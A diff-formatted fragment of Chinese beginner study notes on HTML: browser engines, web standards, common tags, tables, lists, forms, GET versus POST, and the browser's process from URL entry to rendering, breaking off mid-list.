+<th><strong>内核</strong></th>
+<th><strong>备注</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>IE</td>
+<td>Trident</td>
+<td>IE、猎豹安全、360极速浏览器、百度浏览器</td>
+</tr>
+<tr>
+<td>firefox</td>
+<td>Gecko</td>
+<td>可惜这几年已经没落了，打开速度慢、升级频繁、猪一样的队友flash、神一样的对手chrome。</td>
+</tr>
+<tr>
+<td>Safari</td>
+<td>webkit</td>
+<td>现在很多人错误地把 webkit 叫做 chrome内核（即使 chrome内核已经是 blink 了）。苹果感觉像被别人抢了媳妇，都哭晕在厕所里面了。</td>
+</tr>
+<tr>
+<td>chrome</td>
+<td>Chromium/Blink</td>
+<td>在 Chromium 项目中研发 Blink 渲染引擎（即浏览器核心），内置于 Chrome 浏览器之中。Blink 其实是 WebKit 的分支。大部分国产浏览器最新版都采用Blink内核。二次开发</td>
+</tr>
+<tr>
+<td>Opera</td>
+<td>blink</td>
+<td>现在跟随chrome用blink内核。</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Web****标准</strong></p>
+<p>**「构成」**👉 <strong>结构标准，表现标准和行为标准</strong></p>
+<ul>
+<li><strong>结构标准</strong>用于对网页元素进行整理和分类(HTML)</li>
+<li><strong>表现标准</strong>用于设置网页元素的版式、颜色、大小等外观属性(CSS)</li>
+<li><strong>行为标准</strong>用于对网页模型的定义及交互的编写(JavaScript)</li>
+</ul>
+<p>**「<strong><strong>Web</strong></strong>标准的优点」**👇</p>
+<ul>
+<li><strong>易于维护</strong>：只需更改CSS文件，就可以改变整站的样式</li>
+<li><strong>页面响应快</strong>：HTML文档体积变小，响应时间短</li>
+<li><strong>可访问性</strong>：语义化的HTML（结构和表现相分离的HTML）编写的网页文件，更容易被屏幕阅读器识别</li>
+<li><strong>设备兼容性</strong>：不同的样式表可以让网页在不同的设备上呈现不同的样式</li>
+<li><strong>搜索引擎</strong>：语义化的HTML能更容易被搜索引擎解析，提升排名</li>
+</ul>
+<p><strong>二、<strong><strong>HTML</strong></strong>初识</strong></p>
+<p><strong>HTML****初识</strong></p>
+<p><strong>「<strong><strong>HTML</strong></strong>」</strong>(Hyper Text Markup Language):超文本标记语言</p>
+<p><strong>「所谓超文本，有<strong><strong>2</strong></strong>层含义：」</strong></p>
+<ul>
+<li>因为它可以加入图片、声音、动画、多媒体等内容**（超越文本限制** <strong>）</strong></li>
+<li>不仅如此，它还可以从一个文件跳转到另一个文件，与世界各地主机的文件连接**（超级链接文本）**。</li>
+</ul>
+<p><strong>「<strong><strong>HTML</strong></strong>骨架格式」</strong></p>
+<!-- 页面中最大的标签 根标签 -->
+ <html>
+   <!-- 头部标签 -->
+   <head>   
+     <!-- 标题标签 -->
+     <title></title> 
+   </head>
+   <!-- 文档的主体 -->
+   <body>
+   </body>
+ </html>
+<p><strong>「团队约定大小写」</strong></p>
+<ul>
+<li>HTML标签名、类名、标签属性和大部分属性值统一用小写</li>
+</ul>
+<p><strong>「<strong><strong>HTML</strong></strong>元素标签分类」</strong></p>
+<ul>
+<li>常规元素(双标签)</li>
+<li>空元素(单标签)</li>
+</ul>
+<p>常规元素(双标签)<br>
+&lt;标签名&gt; 内容 &lt;/标签名&gt;  比如<body>我是文字</body></p>
+<p>空元素(单标签)<br>
+&lt;标签名 /&gt; 比如 <br />或<br></p>
+<p><strong>「<strong><strong>HTML</strong></strong>标签关系」</strong></p>
+<ul>
+<li>
+<p><strong>嵌套关系</strong>父子级包含关系</p>
+</li>
+<li>
+<p><strong>并列关系</strong>兄弟级并列关系</p>
+</li>
+<li>
+<ul>
+<li>如果两个标签之间的关系是<strong>嵌套关系</strong>，子元素最好缩进一个tab键的身位（一个tab是4个空格）。如果是<strong>并列关系</strong>，最好上下对齐。</li>
+</ul>
+</li>
+</ul>
+<p><strong>文档类型</strong>**<!DOCTYPE >**</p>
+<p>**「文档类型」<strong>用来说明你用的XHTML或者HTML是什么版本。</strong><!DOCTYPE html>**告诉浏览器按照HTML5标准解析页面。</p>
+<p><strong>页面语言****lang</strong></p>
+<p><strong>lang</strong>指定该html标签内容所用的语言</p>
+ <html lang="en"> 
+  en 定义语言为英语 zh-CN定义语言为中文
+<p><strong>「<strong><strong>lang</strong></strong>的作用」</strong></p>
+<ul>
+<li>根据根据lang属性来设定不同语言的css样式，或者字体</li>
+<li>告诉搜索引擎做精确的识别</li>
+<li>让语法检查程序做语言识别</li>
+<li>帮助翻译工具做识别</li>
+<li>帮助网页阅读程序做识别</li>
+</ul>
+<p><strong>字符集</strong></p>
+<p><strong>「字符集」</strong>(Character set)是多个字符的集合,计算机要准确的处理各种字符集文字，需要进行字符编码，以便计算机能够识别和存储各种文字。</p>
+<ul>
+<li>
+<p>UTF-8是目前最常用的字符集编码方式</p>
+</li>
+<li>
+<p>让 html 文件是以 UTF-8 编码保存的， 浏览器根据编码去解码对应的html内容。</p>
+<meta charset="UTF-8" />
+</li>
+</ul>
+<p><strong>「<strong><strong>meta viewport</strong></strong>的用法」</strong><br>
+通常viewport是指视窗、视口。浏览器上(也可能是一个app中的webview)用来显示网页的那部分区域。在移动端和pc端视口是不同的，pc端的视口是浏览器窗口区域，而在移动端有三个不同的视口概念：布局视口、视觉视口、理想视口</p>
+<p>meta有两个属性name 和 http-equiv</p>
+<p><strong>name****属性的取值</strong></p>
+<ul>
+<li>keywords(关键字) 告诉搜索引擎，该网页的关键字</li>
+<li>description(网站内容描述) 用于告诉搜索引擎，你网站的主要内容。</li>
+<li>viewport(移动端的窗口)</li>
+<li>robots(定义搜索引擎爬虫的索引方式)     robots用来告诉爬虫哪些页面需要索引，哪些页面不需要索引</li>
+<li>author(作者)</li>
+<li>generator(网页制作软件）</li>
+<li>copyright(版权)</li>
+</ul>
+<p><strong>http-equiv****有以下参数</strong></p>
+<p><strong>http-equiv</strong>相当于http的文件头作用，它可以向浏览器传回一些有用的信息，以帮助正确和精确地显示网页内容</p>
+<ul>
+<li><strong>content-Type</strong> 设定网页字符集(Html4用法，不推荐)</li>
+<li><strong>Expires(<strong><strong>期限</strong></strong>)</strong> ,可以用于设定网页的到期时间。一旦网页过期，必须到服务器上重新传输。</li>
+<li><strong>Pragma(cache<strong><strong>模式</strong></strong>)</strong>,是用于设定禁止浏览器从本地机的缓存中调阅页面内容，设定后一旦离开网页就无法从Cache中再调出</li>
+<li><strong>Refresh(<strong><strong>刷新</strong></strong>)</strong>,自动刷新并指向新页面。</li>
+<li><strong>cache-control</strong>（请求和响应遵循的缓存机制）</li>
+</ul>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<p><strong>HTML****标签的语义化</strong></p>
+<ul>
+<li>方便代码的阅读和维护，样式丢失的时候能让页面呈现清晰的结构。</li>
+<li>有利于SEO，搜索引擎根据标签来确定上下文和各个关键字的权重。</li>
+<li>方便其他设备解析，如盲人阅读器根据语义渲染网页</li>
+</ul>
+<p><strong>「拓展」</strong> 标签：规定页面上所有链接的默认 URL 和设置整体链接的打开状态</p>
+<head>
+   <base href="http://www.baidu.com" target="_blank">
+   <base target="_self">
+ </head>
+ <body>
+   <a href="">测试</a> 跳转到 百度
+ </body>
+<p><strong>HTML****常用标签</strong></p>
+<p><strong>常用标签</strong></p>
+<p>**「**<strong>1.</strong> **排版标签」**主要和css搭配使用，显示网页结构的标签，是网页布局最常用的标签。</p>
+<ul>
+<li>标题标签h(h1~h6)</li>
+<li>段落标签p,可以把 HTML 文档分割为若干段落</li>
+<li>水平线标签hr</li>
+<li>换行标签br</li>
+<li>div和span标签:是没有语义的,是我们网页布局最主要的2个盒子。</li>
+</ul>
+<p>**「**<strong>2.</strong> <strong>排版标签」</strong></p>
+<ul>
+<li><strong>b</strong>和<strong>strong</strong> 文字以粗体显示</li>
+<li><strong>i</strong>和<strong>em</strong> 文字以斜体显示</li>
+<li><strong>s</strong>和<strong>del</strong> 文字以加删除线显示</li>
+<li><strong>u</strong>和<strong>ins</strong> 文字以加下划线显示</li>
+</ul>
+<p><strong>「<strong><strong>3.</strong> <strong>标签属性</strong></strong>(<strong><strong>行内式</strong></strong>)****」</strong></p>
+<p>使用HTML制作网页时，如果想让HTML标签提供更多的信息，可以使用HTML标签的属性加以设置。</p>
+<p>&lt;标签名 属性1=“属性值1” 属性2=“属性值2” …&gt; 内容 &lt;/标签名&gt;<br>
+&lt;手机 颜色=“红色” 大小=“5寸”&gt; &lt;/手机&gt;</p>
+<p><strong>「<strong><strong>4.</strong> **图像标签</strong><strong>img</strong></strong>」**</p>
+<p><img src="../images/clip_image002-164854855332226.jpg" alt="图片"><strong>注意：</strong></p>
+<ul>
+<li>标签可以拥有多个属性，必须写在开始标签中，位于标签名后面。</li>
+<li>属性之间不分先后顺序，标签名与属性、属性与属性之间均以空格分开。</li>
+<li>采取  键值对 的格式       key=“value”  的格式</li>
+</ul>
+<img src="cz.jpg" width="300" height="300" border="3" title="这是个小蒲公英" />
+<p><strong>「<strong><strong>5.</strong> <strong>链接标签</strong></strong>(<strong><strong>重点</strong></strong>)****」</strong></p>
+<p><a href="跳转目标" target="目标窗口的弹出方式">文本或图像</a> target=“_self”  默认窗口弹出方式 target=“_blank” 新窗口弹出</p>
+<table>
+<thead>
+<tr>
+<th><strong>属性</strong></th>
+<th><strong>作用</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>href</td>
+<td>用于指定链接目标的url地址，（必须属性）当为标签应用href属性时，它就具有了超链接的功能</td>
+</tr>
+<tr>
+<td>target</td>
+<td>用于指定链接页面的打开方式，其取值有_self和_blank两种，其中_self为默认值，_blank为在新窗口中打开方式。</td>
+</tr>
+</tbody>
+</table>
+<p><strong>src</strong> <strong>和</strong> <strong>href</strong> <strong>的区别</strong></p>
+<p>一句话概括:<strong>src</strong> <strong>是引入资源的</strong> <strong>href</strong> <strong>是跳转<strong><strong>url</strong></strong>的</strong></p>
+<ol>
+<li>src用于替换当前元素，href用于在当前文档和引用资源之间确立联系。</li>
+<li>src是source的缩写，指向外部资源的位置，指向的内容将会嵌入到文档中当前标签所在位置；在请求src资源时会将其指向的资源下载并应用到文档内，例如js脚本，img图片和frame等元素。当浏览器解析到该元素时，会暂停其他资源的下载和处理，直到将该资源加载、编译、执行完毕，图片和框架等元素也如此，类似于将所指向资源嵌入当前标签内。这也是为什么将js脚本放在底部而不是头部。</li>
+<li>href是Hypertext Reference的缩写，指向网络资源所在位置，建立和当前元素（锚点）或当前文档（链接）之间的链接。如果我们在文档中添加那么浏览器会识别该文档为css文件，就会并行下载资源并且不会停止对当前文档的处理。这也是为什么建议使用link方式来加载css，而不是使用@import方式。</li>
+</ol>
+<p><strong>注意：</strong></p>
+<ol>
+<li>外部链接 需要添加     http:// <a target="_blank" rel="noopener" href="http://www.baidu.com">www.baidu.com</a></li>
+<li>内部链接 直接链接内部页面名称即可 比如 &lt; a     href=“index.html”&gt; 首页</li>
+<li>如果当时没有确定链接目标时，通常将链接标签的href属性值定义为“#”(即href=“#”)，表示该链接暂时为一个空链接。</li>
+<li>不仅可以创建文本超链接，在网页中各种网页元素，如图像、表格、音频、视频等都可以添加超链接。</li>
+</ol>
+<p><strong>锚点定位：通过创建锚点链接，用户能够快速定位到目标内容。</strong></p>
+<p>\1. 使用相应的id名标注跳转目标的位置。 (找目标)</p>
+  <h3 id="two">第2集</h3> 
+<p>\2. 使用<a href="#id名">链接文本</a>创建链接文本（被点击的）<br>
+<a href="#two"></p>
+<p>**「**<strong>6.</strong> <strong>注释标签」</strong></p>
+ <!-- 注释语句 -->   
+<p>快捷键是：  ctrl + /<br>
+或者 ctrl +shift + /</p>
+<p>**团队约定：**注释内容前后各一个空格字符，注释位于要注释代码的上面，单独占一行</p>
+<p>**「**<strong>7.</strong> <strong>路径」</strong></p>
+<p><img src="../images/clip_image004-164854855332228.png" alt="图片">**「**<strong>8.</strong> <strong>其他知识」</strong></p>
+<p><strong>预格式化文本<strong><strong>pre</strong></strong>标签</strong>元素中的文本通常会保留空格和换行符。而文本也会呈现为等宽字体。格式化文本就是 ，按照我们预先写好的文字格式来显示页面， 保留空格和换行等。</p>
+<p><strong>特殊字符</strong><img src="../images/clip_image006-164854855332225.jpg" alt="图片"><strong>什么是****XHTML</strong></p>
+<ul>
+<li>XHTML 指**「可扩展超文本标签语言」**（EXtensible     HyperText Markup Language）。</li>
+<li>XHTML 的目标是取代 HTML。</li>
+<li>XHTML 与 HTML 4.01 几乎是相同的。</li>
+<li>XHTML 是更严格更纯净的 HTML 版本。</li>
+<li>XHTML 是作为一种 XML 应用被重新定义的     HTML,是严格版本的HTML。例如它要求标签必须小写，标签必须被正确关闭，标签顺序必须正确排列，对于属性都必须使用双引号等。</li>
+<li>XHTML 是一个 W3C 标准。</li>
+</ul>
+<p><strong>写<strong><strong>HTML</strong></strong>代码时应注意什么？</strong></p>
+<ul>
+<li>尽可能少的使用无语义的标签div和span；</li>
+<li>在语义不明显时，既可以使用div或者p时，尽量用p, 因为p在默认情况下有上下间距，对兼容特殊终端有利；</li>
+<li>不要使用纯样式标签，如：b、font、u等，改用css设置。</li>
+<li>需要强调的文本，可以包含在strong或者em标签中（浏览器预设样式，能用CSS指定就不用他们），strong默认样式是加粗（不要用b），em是斜体（不用i）；</li>
+<li>使用表格时，标题要用<strong>caption</strong>，表头用thead，主体部分用tbody包围，尾部用tfoot包围。表头和一般单元格要区分开，表头用th，单元格用td；</li>
+<li>表单域要用<strong>fieldset</strong>标签包起来，并用<strong>legend</strong>标签说明表单的用途；</li>
+<li>每个input标签对应的说明文本都需要使用<strong>label****标签</strong>，并且通过为input设置id属性，在lable标签中设置for来让说明文本和相对应的input关联起来。</li>
+</ul>
+<p><strong>表格</strong></p>
+<p>**「**<strong>1.</strong> <strong>表格」</strong></p>
+<p>现在还是较为常用的一种标签，但不是用来布局，**常见显示、展示表格式数据。**因为它可以让数据显示的非常的规整，可读性非常好。<strong>特别是后台展示数据的时候表格运用是否熟练就显得很重要</strong>，一个清爽简约的表格能够把繁杂的数据表现得很有条理。</p>
+<p>**「**<strong>2.</strong> <strong>创建表格」</strong></p>
+<table>   <tr>     <td>单元格内的文字</td>     ...   </tr>   ... </table>
+<p><strong>table</strong>**、<strong><strong>tr</strong></strong>、<strong><strong>td</strong></strong>，**他们是创建表格的基本标签，缺一不可</p>
+<ul>
+<li>table用于定义一个表格标签。</li>
+<li>tr标签 用于定义表格中的行，必须嵌套在     table标签中。</li>
+<li>td 用于定义表格中的单元格，必须嵌套在<tr></tr>标签中。</li>
+<li>字母 td 指表格数据（table     data），即数据单元格的内容，现在我们明白，表格最合适的地方就是用来存储数据的。td像一个容器，可以容纳所有的元素。<img src="../images/clip_image008-164854855332230.jpg" alt="图片"></li>
+</ul>
+<p><strong>表头单元格标签****th</strong>:一般表头单元格位于表格的第一行或第一列，并且文本加粗居中,只需用表头标签<th></th>替代相应的单元格标签<td></td>即可。</p>
+<p><img src="../images/clip_image010-164854855332231.png" alt="图片"></p>
+<p><strong>表格标题****caption</strong>通常这个标题会被居中且显示于表格之上。caption 标签必须紧随 table 标签之后。这个标签只存在 表格里面才有意义。你是风儿我是沙</p>
+<table>    <caption>我是表格标题</caption> </table>
+<p>**「**<strong>3.</strong> <strong>表格属性」</strong></p>
+<p><img src="../images/clip_image012-164854855332232.jpg" alt="图片">三参为0，平时开发的我们这三个参数   <strong>border  cellpadding  cellspacing</strong> 为  0</p>
+<p>**「**<strong>4.</strong> <strong>合并单元格」</strong>,合并的顺序我们按照  <strong>先上</strong> <strong>后下</strong>   <strong>先左</strong>  <strong>后右</strong> 的顺序 ,合并完之后需要删除多余的单元格。</p>
+<ul>
+<li>跨行合并：rowspan=“合并单元格的个数”</li>
+<li>跨列合并：colspan=“合并单元格的个数”</li>
+</ul>
+<p>**「**<strong>5.</strong> <strong>总结表格」</strong></p>
+<table>
+<thead>
+<tr>
+<th><strong>标签名</strong></th>
+<th><strong>定义</strong></th>
+<th><strong>说明</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><table></table></td>
+<td>表格标签</td>
+<td>就是一个四方的盒子</td>
+</tr>
+<tr>
+<td><tr></tr></td>
+<td>表格行标签</td>
+<td>行标签要再table标签内部才有意义</td>
+</tr>
+<tr>
+<td><td></td></td>
+<td>单元格标签</td>
+<td>单元格标签是个容器级元素，可以放任何东西</td>
+</tr>
+<tr>
+<td><th></th></td>
+<td>表头单元格标签</td>
+<td>它还是一个单元格，但是里面的文字会居中且加粗</td>
+</tr>
+<tr>
+<td><caption></caption></td>
+<td>表格标题标签</td>
+<td>表格的标题，跟着表格一起走，和表格居中对齐</td>
+</tr>
+<tr>
+<td>clospan 和 rowspan</td>
+<td>合并属性</td>
+<td>用来合并单元格的</td>
+</tr>
+</tbody>
+</table>
+<p>**「**<strong>6.</strong> <strong>表格划分结构」</strong></p>
+<p>对于比较复杂的表格，表格的结构也就相对的复杂了，所以又将表格分割成三个部分：题头、正文和脚注。而这三部分分别用:thead,tbody,tfoot来标注， 这样更好的分清表格结构。</p>
+<p><strong>注意：</strong><br>
+1.<thead></thead>：用于定义表格的头部。用来放标题之类的东西。<thead> 内部必须拥有<tr> 标签！<br>
+\2. <tbody></tbody>：用于定义表格的主体。放数据本体 。<br>
+\3. <tfoot></tfoot>放表格的脚注之类。<br>
+\4. 以上标签都是放到table标签中。</p>
+<p><strong>列表</strong></p>
+<p>**「列表<strong><strong>ul</strong></strong>」**容器里面装载着结构，样式一致的文字或图表的一种形式，叫列表。</p>
+<p>列表最大的特点就是整齐 、整洁、 有序，跟表格类似，但是它可组合自由度会更高。</p>
+<p><strong>「<strong><strong>1.</strong> <strong>无序列表</strong> <strong>ul</strong></strong>」</strong></p>
+<ul>
+<li>
+<ul></ul>中只能嵌套<li></li>，直接在<ul></ul>标签中输入其他标签或者文字的做法是不被允许的。
+</li>
+<li>
+<li>与</li>之间相当于一个容器，可以容纳所有元素。
+</li>
+</ul>
+<ul>
+  <li>列表项1</li>
+  <li>列表项2</li>
+  <li>列表项3</li>
+  ......
+ </ul>
+<p><strong>「<strong><strong>2.</strong> <strong>有序列表</strong> <strong>ol</strong></strong>」</strong></p>
+<ul>
+<li>
+<ol>标签中的type属性值为排序的序列号，不添加type属性时，有序列表默认从数字1开始排序。
+</li>
+<li>常用的type属性值分别为是1，a，A，i，I</li>
+<li>
+<ol reversed="reversed">中的reversed属性能够让有序列表中的序列倒序排列。
+</li>
+<li>
+<ol start="3">中的start属性值为3，有序列表中的第一个序列号将从3开始排列。
+</li>
+</ul>
+<ol type="A"> 
+  <li>列表项1</li>
+  <li>列表二</li>
+  <li>列表三</li>
+ </ol>
+<p><strong>「<strong><strong>2.</strong> <strong>自定义列表</strong> <strong>dl</strong></strong>」</strong></p>
+<ul>
+<li>定义列表常用于对术语或名词进行解释和描述，定义列表的列表项前没有任何项目符号。</li>
+</ul>
+<dl>   <dt>名词1</dt>   <dd>名词1解释1</dd>   <dd>名词1解释2</dd>   ...   <dt>名词2</dt>   <dd>名词2解释1</dd>   <dd>名词2解释2</dd>   ... </dl>
+<p><img src="../images/clip_image014-164854855332229.png" alt="图片"></p>
+<p><strong>表单</strong></p>
+<p>在HTML中，一个完整的表单通常由<strong>表单控件</strong>（也称为表单元素）、<strong>提示信息</strong>和<strong>表单域</strong>3个部分构成。表单目的是为了收集用户信息。</p>
+<p><img src="../images/clip_image016-164854855332227.png" alt="图片"><strong>表单控件：</strong><br>
+包含了具体的表单功能项，如单行文本输入框、密码输入框、复选框、提交按钮、重置按钮等。<br>
+<strong>提示信息：</strong><br>
+一个表单中通常还需要包含一些说明性的文字，提示用户进行填写和操作。<br>
+<strong>表单域：</strong><br>
+它相当于一个容器，用来容纳所有的表单控件和提示信息，可以通过他定义处理表单数据所用程序的url地址，以及数据提交到服务器的方法。如果不定义表单域，表单中的数据就无法传送到后台服务器。</p>
+<p>**「**<strong>1. input</strong> <strong>控件」</strong></p>
+<input type="属性值" value="你好">
+<ul>
+<li>input 输入的意思</li>
+<li><input />标签为单标签</li>
+<li>type属性设置不同的属性值用来指定不同的控件类型</li>
+<li>除了type属性还有别的属性</li>
+</ul>
+<p><strong>常用属性：</strong></p>
+<p><img src="../images/clip_image018-164854855332233.jpg" alt="图片"></p>
+<p>用户名: <input type="text" /><br>
+密 码：<input type="password" /></p>
+<p><strong>value****属性</strong></p>
+<ul>
+<li>value 默认的文本值。有些表单想刚打开页面就默认显示几个文字，就可以通过这个value     来设置。</li>
+</ul>
+<p>用户名:<input type="text" name="username" value="请输入用户名"></p>
+<p><strong>name****属性</strong></p>
+<ul>
+<li>
+<p>name表单的名字， 这样，后台可以通过这个name属性找到这个表单。 页面中的表单很多，name主要作用就是用于区别不同的表单。</p>
+</li>
+<li>
+<ul>
+<li>name属性后面的值，是我们自己定义的。</li>
+<li>radio  如果是一组，我们必须给他们命名相同的名字 name       这样就可以多个选其中的一个啦</li>
+<li>name属性，我们现在用的较少，但是，当我们学ajax 和后台的时候，是必须的。</li>
+</ul>
+</li>
+</ul>
+<p><input type="radio" name="sex" />男<br>
+<input type="radio" name="sex" />女</p>
+<p><strong>checked****属性</strong></p>
+<ul>
+<li>表示默认选中状态。 较常见于 单选按钮和复选按钮。</li>
+</ul>
+<p>性  别:<br>
+<input type="radio" name="sex" value="男" checked="checked" />男<br>
+<input type="radio" name="sex" value="女" />女</p>
+<p><strong>input</strong> <strong>属性小结</strong></p>
+<table>
+<thead>
+<tr>
+<th><strong>属性</strong></th>
+<th><strong>说明</strong></th>
+<th><strong>作用</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>type</td>
+<td>表单类型</td>
+<td>用来指定不同的控件类型</td>
+</tr>
+<tr>
+<td>value</td>
+<td>表单值</td>
+<td>表单里面默认显示的文本</td>
+</tr>
+<tr>
+<td>name</td>
+<td>表单名字</td>
+<td>页面中的表单很多，name主要作用就是用于区别不同的表单。</td>
+</tr>
+<tr>
+<td>checked</td>
+<td>默认选中</td>
+<td>表示那个单选或者复选按钮一开始就被选中了</td>
+</tr>
+</tbody>
+</table>
+<p><strong>「<strong><strong>2.  label</strong></strong>标签」</strong></p>
+<ul>
+<li>label 标签为 input 元素定义标注（标签）。</li>
+<li>label标签主要目的是为了提高用户体验。为用户提高最优秀的服务。</li>
+</ul>
+<p>**作用：**用于绑定一个表单元素, 当点击label标签的时候, 被绑定的表单元素就会获得输入焦点。</p>
+<p><strong>如何绑定元素呢</strong></p>
+<ul>
+<li>第一种用法就是用label标签直接包含input表单， 适合单个表单选择</li>
+<li>第二种用法 for 属性规定 label 与哪个表单元素绑定(通过id)。</li>
+</ul>
+<p>第一种<br>
+<label> 用户名：<br>
+<input type="radio" name="usename" value="请输入用户名"><br>
+</label></p>
+<p>第二种<br>
+<label for="sex">男</label><br>
+<input type="radio" name="sex" id="sex"></p>
+<p><strong>「<strong><strong>3.  textarea</strong></strong>控件</strong>**(<strong><strong>文本域</strong></strong>)****」**</p>
+<ul>
+<li>通过textarea控件可以轻松地创建多行文本输入框.</li>
+<li>cols=“每行中的字符数” rows=“显示的行数”      我们实际开发不用</li>
+</ul>
+<p><img src="../images/clip_image020-164854855332236.jpg" alt="图片"></p>
+ <textarea >
+   文本内容
+  </textarea>
+<p><strong>文本框和文本域区别</strong></p>
+<table>
+<thead>
+<tr>
+<th><strong>表单</strong></th>
+<th><strong>名称</strong></th>
+<th><strong>区别</strong></th>
+<th><strong>默认值显示</strong></th>
+<th><strong>用于场景</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>input type=“text”</td>
+<td>文本框</td>
+<td>只能显示一行文本</td>
+<td>单标签，通过value显示默认值</td>
+<td>用户名、昵称、密码等</td>
+</tr>
+<tr>
+<td>textarea</td>
+<td>文本域</td>
+<td>可以显示多行文本</td>
+<td>双标签，默认值写到标签中间</td>
+<td>留言板</td>
+</tr>
+</tbody>
+</table>
+<p><strong>「<strong><strong>4.  select</strong></strong>下拉列表」</strong></p>
+<ul>
+<li>如果有多个选项让用户选择，为了节约空间，我们可以使用select控件定义下拉列表。</li>
+<li>在option 中定义**selected =&quot; selected     &quot;**时，当前项即为默认选中项。</li>
+<li>我们实际开发会用的比较少</li>
+</ul>
+<p><img src="../images/clip_image021-164854855332234.png" alt="图片"></p>
+<select>
+  <option>选项1</option>
+  <option>选项2</option>
+  <option>选项3</option>
+  ...
+ </select>
+<p><strong>form****表单域</strong></p>
+<ul>
+<li>
+<p>收集的用户信息怎么传递给服务器？</p>
+</li>
+<li>
+<ul>
+<li>通过<strong>form****表单域</strong></li>
+</ul>
+</li>
+<li>
+<p>目的：</p>
+</li>
+<li>
+<ul>
+<li>在HTML中，form标签被用于定义表单域，以实现用户信息的收集和传递，form中的所有内容都会被提交给服务器。</li>
+</ul>
+</li>
+</ul>
+<form action="url地址" method="提交方式" name="表单名称">
+  各种表单控件
+ </form>
+<p><strong>常用属性：</strong></p>
+<ul>
+<li>每个表单都应该有自己表单域。后面学 <strong>ajax</strong> <strong>后台交互</strong>的时候，必须需要form表单域。</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th><strong>属性</strong></th>
+<th><strong>属性值</strong></th>
+<th><strong>作用</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>action</td>
+<td>url地址</td>
+<td>用于指定接收并处理表单数据的服务器程序的url地址。</td>
+</tr>
+<tr>
+<td>method</td>
+<td>get/post</td>
+<td>用于设置表单数据的提交方式，其取值为get或post。</td>
+</tr>
+<tr>
+<td>name</td>
+<td>名称</td>
+<td>用于指定表单的名称，以区分同一个页面中的多个表单。</td>
+</tr>
+</tbody>
+</table>
+<p><strong>GET</strong> <strong>和</strong> <strong>POST</strong> <strong>的区别</strong></p>
+<ul>
+<li>GET在浏览器回退时是无害的，而POST会再次提交请求。</li>
+<li>GET请求会被浏览器主动cache，而POST不会，除非手动设置。</li>
+<li>GET请求只能进行url编码，而POST支持多种编码方式。</li>
+<li>GET请求参数会被完整保留在浏览器历史记录里，而POST中的参数不会被保留。</li>
+<li>GET请求大小一般是(1024字节)，http协议并没有限制，而与服务器，操作系统有关，POST理论上来说没有大小限制，http协议规范也没有进行大小限制，但实际上post所能传递的数据量根据取决于服务器的设置和内存大小。</li>
+<li>对参数的数据类型，GET只接受ASCII字符，而POST没有限制。</li>
+<li>GET比POST更不安全，因为参数直接暴露在URL上，所以不能用来传递敏感信息。</li>
+</ul>
+<p><strong>团队约定：</strong></p>
+<ul>
+<li>元素属性值使用双引号语法</li>
+<li>元素属性值可以写上的都写上</li>
+</ul>
+<p>推荐<br>
+<input type="text" /><br>
+<input type="radio" name="name" checked="checked" /></p>
+<p><strong>从输入<strong><strong>url</strong></strong>到页面展示发生了什么</strong>**(<strong><strong>面试</strong></strong>)**</p>
+<p>作者：Twinkle_<br>
+链接：<a target="_blank" rel="noopener" href="https://juejin.im/post/6869279683230629896">https://juejin.im/post/6869279683230629896</a><br>
+来源：掘金</p>
+<p><strong>浏览器的多进程架构</strong></p>
+<p>从浏览器输入 <strong>URL</strong> 到页面渲染的整个过程都是由 浏览器架构中的各个进程之间的配合完成。</p>
+<ol>
+<li><strong>浏览器主进程</strong>: 管理子进程、提供服务功能</li>
+<li><strong>渲染进程</strong>：将HTML、CSS、JS渲染成界面，js引擎v8和排版引擎Blink就在上面，他会为每一个tab页面创建一个渲染进程</li>
+<li><strong>GPU****进程</strong>：本来是负责处理3Dcss的，后来慢慢的UI界面也交给GPU来绘制</li>
+<li><strong>网络进程</strong>：就是负责网络请求，网络资源加载的进程</li>
+<li><strong>插件进程</strong>：负责插件的运行的，因为插件很容易崩溃，把它放到独立的进程里不要让它影响别人</li>
+</ol>
+<p><strong>浏览器的多进程架构</strong></p>
+<p>从用户输入信息到页面展示的不同阶段，是不同的进程在发挥作用，示意图如下：<img src="../images/clip_image023-164854855332235.jpg" alt="图片">从图中可以看出，整个过程是需要各个进程之间相互配合完成的，过程大致可以描述为：</p>
+<ol>
+<li>用户输入url,处理输入信息，主进程开始导航，交给网络进程干活</li>
+<li>网络进程发起网络请求，其中有可能会发生重定向</li>
+<li>服务器响应URL之后，主进程就要通知渲染进程，你要开始干活了</li>
+<li>渲染进程准备好了，要想渲染进程提交数据，这个时间叫做提交文档</li>
+<li>渲染进程接受到数据，完成页面渲染。</li>
+</ol>
+<p><strong>具体过程</strong></p>
+<ol>
+<li>输入url</li>
+</ol>
+<ul>
+<li>用户输入url，处理输入信息：</li>
+<li>如果为非url结构的字符串，交给浏览器<strong>默认引擎</strong>去搜索改字符串；</li>
+<li>若为url结构的字符串，浏览器主进程会交给 <strong>网络进程</strong> ,开始干活。</li>
+</ul>
+<p>2.1 查找浏览器缓存</p>
+<ul>
+<li>网络进程会先看看是否存在本地缓存，如果有就直接返回资源给浏览器进程，无则下一步 DNS-&gt; IP -&gt; TCP</li>
+</ul>
+<p>2.2 DNS解析</p>
+<ul>
+<li>网络进程拿到url后，先会进行DNS域名解析得到<strong>IP****地址</strong>。如果请求协议是HTTPS，那么还需要建立TLS连接。</li>
+</ul>
+<p>2.2 建立TCP连接，三次握手</p>
+<ul>
+<li>接下来就是利用IP地址和服务器建立TCP连接。连接建立之后，向服务器发送请求。</li>
+</ul>
+<ol>
+<li>服务器响应</li>
+</ol>
+<ul>
+<li>服务器收到请求信息后，会根据请求信息生成响应行、响应头、响应体，并发给网络进程。网络进程接受了响应信息之后，就开始解析响应头的内容。</li>
+<li><strong>网络进程解析响应行和响应头信息的过程：</strong></li>
+</ul>
+<p>3.1 重定向</p>
+<ul>
+<li>如果响应行状态码为301（永久重定向）和302（临时），那么说明需要重定向到其他url。这时候网络进程会从响应头中的Location字段里读取重定向的地址，并重新发起网络请求。</li>
+</ul>
+<p>3.2 响应数据处理</p>
+<ul>
